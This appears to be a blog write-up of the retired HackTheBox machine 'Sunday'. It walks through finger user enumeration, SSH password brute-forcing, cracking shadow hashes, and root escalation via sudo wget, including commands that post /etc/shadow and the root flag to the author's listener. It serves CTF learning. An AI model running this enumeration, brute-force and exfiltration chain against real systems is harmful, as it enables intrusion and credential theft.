---
layout: post
title: "Writeup: HackTheBox Sunday - NO Metasploit"
description: "Rooting Sunday without using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][].
All published writeups are for retired HTB machines.
Whether or not I use Metasploit to pwn the server will be indicated in the title.
 
# Sunday

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.76</small>_

It takes about half an hour for the full port scan to complete.

```bash
artis3n@kali-pop:~/shares/htb/sunday$ sudo nmap -sS -T4 -p- 10.10.10.76

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 15:58 EDT
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.25% done
Warning: 10.10.10.76 giving up on port because retransmission cap hit (6).
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 4.13% done; ETC: 16:28 (0:29:02 remaining)
Stats: 0:02:28 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 8.24% done; ETC: 16:28 (0:27:40 remaining)
Stats: 0:03:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 11.57% done; ETC: 16:27 (0:26:22 remaining)
Stats: 0:06:26 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 22.01% done; ETC: 16:27 (0:22:52 remaining)
Stats: 0:09:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 34.52% done; ETC: 16:27 (0:18:58 remaining)
Stats: 0:16:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 56.46% done; ETC: 16:26 (0:12:30 remaining)
Stats: 0:17:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 61.92% done; ETC: 16:26 (0:10:53 remaining)
Stats: 0:22:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 77.37% done; ETC: 16:26 (0:06:27 remaining)
Stats: 0:25:51 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 91.06% done; ETC: 16:26 (0:02:32 remaining)
Nmap scan report for 10.10.10.76
Host is up (0.013s latency).
Not shown: 55470 closed ports, 10060 filtered ports
PORT      STATE SERVICE                                                                                          
79/tcp    open  finger                                                                                           
111/tcp   open  rpcbind                                                                                          
22022/tcp open  unknown                                                                                          
35809/tcp open  unknown                                                                                          
56550/tcp open  unknown
```

From there I can dig into the ports.

```bash
artis3n@kali-pop:~/shares/htb/sunday$ sudo nmap -sS -T4 -A -p 79,111,22022,35809,56550 10.10.10.76
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:32 EDT
Nmap scan report for 10.10.10.76
Host is up (0.050s latency).

PORT      STATE SERVICE VERSION
79/tcp    open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     HTTP/1.0 ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|_    RTSP/1.0 ???
111/tcp   open  rpcbind 2-4 (RPC #100000)
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
35809/tcp open  unknown
56550/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.80%I=7%D=6/21%Time=5EEFC3F8%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,12,"No\x20one\x20logged\x20on\r\n")%r(Help,5D,"Login\x20\x20\x
SF:20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20W
SF:hen\x20\x20\x20\x20Where\r\nHELP\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(HTTPOptions,93,"Login\x
SF:20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\
SF:x20\x20When\x20\x20\x20\x20Where\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n/\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/
SF:1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n"
SF:)%r(RTSPRequest,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nOPTIONS\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n/\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\?\?\?\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Sun OpenSolaris 2008.11 (94%), Sun Solaris 10 (94%), Sun Solaris 9 or 10, or OpenSolaris 2009.06 snv_111b (94%), Sun Solaris 9 or 10 (SPARC) (92%), Sun Storage 7210 NAS device (92%), Sun Solaris 9 or 10 (92%), Oracle Solaris 11 (91%), Sun Solaris 8 (90%), Sun Solaris 9 (89%), Sun Solaris 8 (SPARC) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   14.00 ms 10.10.14.1
2   14.22 ms 10.10.10.76
```

Notably:

- A `finger` service is running on `tcp/79`.
- SSH is running on `tcp/22022`

[finger][] is not something I was familiar with before this box, so I had a lot of learning to do.
`finger` is used to enumerate information about system users.

I can enumerate users on the system with:

```bash
artis3n@kali-pop:~/shares/htb/sunday$ finger user@10.10.10.76

Login       Name               TTY         Idle    When    Where
xvm      xVM User                           < .  .  .  . >
openldap OpenLDAP User                      < .  .  .  . >
nobody   NFS Anonymous Access               < .  .  .  . >
noaccess No Access User                     < .  .  .  . >
nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >
```

Well, that didn't work.
I eventually found [finger-user-enum.pl][finger enum].
This will take a long time to run, but it eventually finds a `sunny` user.

```bash
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76 | less -S
```

![finger enum results][]

The official write-up includes the discovery of another user on the system, `sammy`, but I wasn't able to find it myself.
With these two users, I can use [patator][] to brute force an SSH login.

```bash
patator ssh_login host=10.10.10.76 port=22022 password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt user=sunny -x ignore:mesg='Authentication failed.'
```

This also takes a while but eventually I get a valid SSH session.

```
18:12:16 patator    INFO - 1     23    30.028 | gemini                             |   208 | Authentication timeout.
18:12:25 patator    INFO - 1     23    30.026 | beauty                             |   794 | Authentication timeout.
18:12:46 patator    INFO - 1     23    30.021 | butterfly                          |   218 | Authentication timeout.
18:12:53 patator    INFO - 0     19     0.036 | sunday                             |   880 | SSH-2.0-Sun_SSH_1.3
18:12:55 patator    INFO - 1     23    30.022 | denver                             |   804 | Authentication timeout.
18:13:16 patator    INFO - 1     23    30.023 | apples                             |   228 | Authentication timeout.
18:13:25 patator    INFO - 1     23    30.024 | jeffrey                            |   814 | Authentication timeout.
18:13:46 patator    INFO - 1     23    30.015 | arthur                             |   238 | Authentication timeou
```

Looks like the password for `sunny` is `sunday`.

Trying to SSH onto the server results in a key negotiation failure:

```bash
artis3n@kali-pop:~/shares/htb/sunday$ ssh -p 22022 sunny@10.10.10.76

Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

I just need to choose any of the offered key exchange algorithms and I can SSH onto the box.

```bash
ssh -p 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76

The authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.
RSA key fingerprint is SHA256:TmRO9yKIj8Rr/KJIZFXEVswWZB/hic/jAHr78xGp+YU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.76]:22022' (RSA) to the list of known hosts.
Password: 
Last login: Tue Apr 24 10:48:11 2018 from 10.10.14.4
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$
```

The `sunny` user does not have a `user.txt` flag, so it must be under `sammy`.
`sunny` can run a `troll` script as root, which doesn't enable anything.
Troll, indeed.

```bash
sunny@sunday:/backup$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
```

`ls -la` highlights a `backup` directory in the system root.

```bash
sunny@sunday:/backup$ ls -la /                                                                                   
total 527                                                                                                         
drwxr-xr-x 26 root root     27 2018-04-24 12:57 .                                                                 
drwxr-xr-x 26 root root     27 2018-04-24 12:57 ..
drwxr-xr-x  2 root root      4 2018-04-15 20:44 backup
lrwxrwxrwx  1 root root      9 2018-04-15 19:52 bin -> ./usr/bin
drwxr-xr-x  6 root sys       7 2018-04-15 19:52 boot
drwxr-xr-x  2 root root      2 2018-04-16 15:33 cdrom
drwxr-xr-x 85 root sys     265 2020-06-21 20:00 dev
drwxr-xr-x  4 root sys      10 2020-06-21 20:00 devices
drwxr-xr-x 77 root sys     224 2020-06-21 20:00 etc
drwxr-xr-x  3 root root      3 2018-04-15 19:44 export
dr-xr-xr-x  1 root root      1 2020-06-21 20:00 home
drwxr-xr-x 19 root sys      20 2018-04-15 19:45 kernel
drwxr-xr-x 10 root bin     180 2018-04-15 19:45 lib
drwx------  2 root root      2 2009-05-14 21:27 lost+found
drwxr-xr-x  2 root root      4 2020-06-21 20:00 media
drwxr-xr-x  2 root sys       2 2018-04-15 19:52 mnt
dr-xr-xr-x  1 root root      1 2020-06-21 20:00 net
drwxr-xr-x  4 root sys       4 2018-04-15 19:52 opt
drwxr-xr-x  5 root sys       5 2009-05-14 21:21 platform
dr-xr-xr-x 54 root root 480032 2020-06-21 21:23 proc
drwx------  6 root root     13 2018-04-24 10:31 root
drwxr-xr-x  4 root root      4 2018-04-15 19:52 rpool
drwxr-xr-x  2 root sys      58 2018-04-15 19:53 sbin
drwxr-xr-x  4 root root      4 2009-05-14 21:18 system
drwxrwxrwt  4 root sys     384 2020-06-21 20:01 tmp
drwxr-xr-x 30 root sys      44 2018-04-15 19:46 usr
drwxr-xr-x 35 root sys      35 2018-04-15 20:26 var
```

Navigating there, I find a `shadow.backup` file which seems to be a copy of `/etc/shadow`.
It includes the `sammy` user's password hash.

```bash
sunny@sunday:~$ cd /backup
sunny@sunday:/backup$ ls -la
total 5
drwxr-xr-x  2 root root   4 2018-04-15 20:44 .
drwxr-xr-x 26 root root  27 2018-04-24 12:57 ..
-r-x--x--x  1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r--  1 root root 319 2018-04-15 20:44 shadow.backup
sunny@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

[john][] is able to make quick work of the hash.

```bash
➜ john shadow.txt --wordlist=/home/artis3n/Documents/SecLists/Passwords/Leaked-Databases/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (sammy)
1g 0:00:00:13 DONE (2020-06-21 17:21) 0.07462g/s 15589p/s 15589c/s 15589C/s dominique15..153462
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

I can now SSH onto the box as `sammy` with the password `cooldude!`.
`sammy` can run `wget` as root.

```bash
sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

I can use this to overwrite a file on the file system.
[GTFOBins][] has some examples.
One option is to overwrite the `/root/troll` script that `sunny` has access to execute.
But, I'd like to go even simpler.
Let's look at `/etc/passwd`.

```bash
sammy@sunday:~$ cat /etc/passwd
root:x:0:0:Super-User:/root:/usr/bin/bash
daemon:x:1:1::/:
bin:x:2:2::/usr/bin:
sys:x:3:3::/:
adm:x:4:4:Admin:/var/adm:
lp:x:71:8:Line Printer Admin:/usr/spool/lp:
uucp:x:5:5:uucp Admin:/usr/lib/uucp:
nuucp:x:9:9:uucp Admin:/var/spool/uucppublic:/usr/lib/uucp/uucico
dladm:x:15:3:Datalink Admin:/:
smmsp:x:25:25:SendMail Message Submission Program:/:
listen:x:37:4:Network Admin:/usr/net/nls:
gdm:x:50:50:GDM Reserved UID:/:
zfssnap:x:51:12:ZFS Automatic Snapshots Reserved UID:/:/usr/bin/pfsh
xvm:x:60:60:xVM User:/:
mysql:x:70:70:MySQL Reserved UID:/:
openldap:x:75:75:OpenLDAP User:/:
webservd:x:80:80:WebServer Reserved UID:/:
postgres:x:90:90:PostgreSQL Reserved UID:/:/usr/bin/pfksh
svctag:x:95:12:Service Tag UID:/:
nobody:x:60001:60001:NFS Anonymous Access User:/:
noaccess:x:60002:60002:No Access User:/:
nobody4:x:65534:65534:SunOS 4.x NFS Anonymous Access User:/:
sammy:x:101:10:sammy:/export/home/sammy:/bin/bash
sunny:x:65535:1:sunny:/export/home/sunny:/bin/bash
```

I copy this down and modify it locally so that `root` now has a password defined as `root`.

```
root:root:0:0:Super-User:/root:/usr/bin/bash
```

Now I can call `wget` as the `sammy` user and overwrite `/etc/passwd`.

```bash
sudo wget http://10.10.14.41:8000/passwd -O /etc/passwd
```

Hmm... this didn't work.
I imagine there is a root password hash in the real `/etc/shadow` taking precedence.
So much for simpler.
I could go back to `/root/troll` but now I want to beat this.
I opt to stream `/etc/shadow`'s contents off the target.

I set up a netcat listener on my host:

```bash
artis3n@kali-pop:~/shares/htb/sunday$ sudo nc -lvnp 80 > shadow
listening on [any] 80 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.76] 53870
^C
```

On the target, I post the file with `wget`:

```bash
sammy@sunday:~$ sudo /usr/bin/wget --post-file=/etc/shadow 10.10.14.41
--21:41:02--  http://10.10.14.41/
           => `index.html'
Connecting to 10.10.14.41:80... connected.
HTTP request sent, awaiting response... No data received.
```

I now have the contents of `/etc/shadow`.

```
artis3n@kali-pop:~/shares/htb/sunday$ cat shadow
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.14.41
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 634

root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146::::::
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
lp:NP:6445::::::
uucp:NP:6445::::::
nuucp:NP:6445::::::
dladm:*LK*:::::::
smmsp:NP:6445::::::
listen:*LK*:::::::
gdm:*LK*:::::::
zfssnap:NP:::::::
xvm:*LK*:6445::::::
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

I move the `root` hash to a file of its own and try to crack it with `john`.

```bash
john root_pass --wordlist=/home/artis3n/Documents/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

This does not work, nor does a few other wordlists.
I admit defeat.
I opt to grab the root flag off the device with `wget`.

```bash
sammy@sunday:~$ sudo /usr/bin/wget --post-file=/root/root.txt 10.10.14.41
--21:49:39--  http://10.10.14.41/
           => `index.html'
Connecting to 10.10.14.41:80... connected.
HTTP request sent, awaiting response... 
```

```bash
artis3n@kali-pop:~/shares/htb/sunday$ sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.76] 63352
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.14.41
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

fb40fab61d99d37536daeec0d97af9b8
```

I did not feel confident walking away from this box, but at the end of the day I got the flags that I needed.

[finger]: https://book.hacktricks.xyz/pentesting/pentesting-finger
[finger enum]: https://github.com/pentestmonkey/finger-user-enum
[gtfobins]: https://gtfobins.github.io/gtfobins/wget/#sudo
[hackthebox]: https://www.hackthebox.eu
[john]: https://github.com/magnumripper/JohnTheRipper
[patator]: https://github.com/lanjelot/patator

[finger enum results]: /assets/img/htb/sunday/finger-enum-results.png
